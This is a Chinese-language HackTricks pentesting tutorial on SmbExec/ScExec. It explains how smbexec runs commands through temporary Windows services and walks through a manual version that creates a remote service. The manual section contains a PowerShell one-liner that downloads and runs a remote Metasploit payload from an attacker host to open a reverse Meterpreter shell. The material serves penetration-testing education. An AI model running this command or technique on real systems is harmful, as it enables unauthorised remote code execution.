# SmbExec/ScExec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 如果您在**网络安全公司**工作，想在**HackTricks**上看到您的**公司广告**，或者想要获取**PEASS最新版本或以PDF格式下载HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)。
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列。
* 获取[**官方PEASS & HackTricks周边商品**](https://peass.creator-spring.com)。
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>

## 它是如何工作的

**Smbexec的工作原理类似于Psexec。** 在这个例子中，**而不是**将"_binpath_"指向受害者内部的恶意可执行文件，我们将**指向** **cmd.exe或powershell.exe**，它们中的一个将下载并执行后门程序。

## **SMBExec**

让我们看看smbexec运行时发生了什么，从攻击者和目标的角度来看：

![](../../.gitbook/assets/smbexec\_prompt.png)

我们知道它创建了一个服务"BTOBTO"。但是当我们执行`sc query`时，目标机器上并没有这个服务。系统日志透露了发生了什么：

![](../../.gitbook/assets/smbexec\_service.png)

服务文件名包含了要执行的命令字符串（%COMSPEC% 指向cmd.exe的绝对路径）。它将要执行的命令回显到一个bat文件中，将stdout和stderr重定向到一个临时文件，然后执行bat文件并删除它。回到Kali，Python脚本通过SMB拉取输出文件，并在我们的"伪shell"中显示内容。对于我们在"shell"中输入的每个命令，都会创建一个新服务并重复该过程。这就是为什么它不需要放置一个二进制文件，它只是将每个想要执行的命令作为一个新服务执行。绝对更隐蔽，但正如我们所见，每执行一个命令就会创建一个事件日志。尽管如此，这仍然是获得一个非交互式"shell"的非常聪明的方法！

## 手动SMBExec

**或者通过服务执行命令**

正如smbexec所示，可以直接从服务binPaths执行命令，而不需要二进制文件。如果您需要在目标Windows机器上执行一个任意命令，这可以是一个有用的技巧。作为一个快速示例，让我们使用远程服务获取一个Meterpreter shell，_而不需要_二进制文件。

我们将使用Metasploit的`web_delivery`模块，并选择一个PowerShell目标，带有反向Meterpreter有效载荷。监听器已设置，并告诉我们在目标机器上执行的命令：
```
powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');
```
从我们的Windows攻击盒子中，我们创建一个远程服务（"metpsh"），并设置binPath来执行带有我们有效载荷的cmd.exe：

![](../../.gitbook/assets/sc\_psh\_create.png)

然后启动它：

![](../../.gitbook/assets/sc\_psh\_start.png)

它出错了，因为我们的服务没有响应，但如果我们查看我们的Metasploit监听器，我们会看到回调已经发生并且有效载荷已经执行。

所有信息都是从这里提取的：[https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在**网络安全公司**工作吗？你想在**HackTricks**中看到你的**公司广告**吗？或者你想要访问**PEASS的最新版本或下载HackTricks的PDF**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列。
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
